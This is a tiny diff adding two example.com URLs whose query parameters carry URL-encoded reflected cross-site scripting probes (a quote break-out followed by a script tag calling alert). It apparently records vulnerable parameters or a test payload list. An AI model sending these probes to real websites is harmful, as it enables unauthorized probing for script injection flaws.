@@ -1,0 +1,4 @@
+http://www.example.com/?section_copy_id=1005176%27%22%3E%3Cscript%3Ealert%28123%29%3C/script%3E
+
+
+http://www.example.com/?section_id=1002815%27%22%3E%3Cscript%3Ealert%28/XSS/%29%3C/script%3E
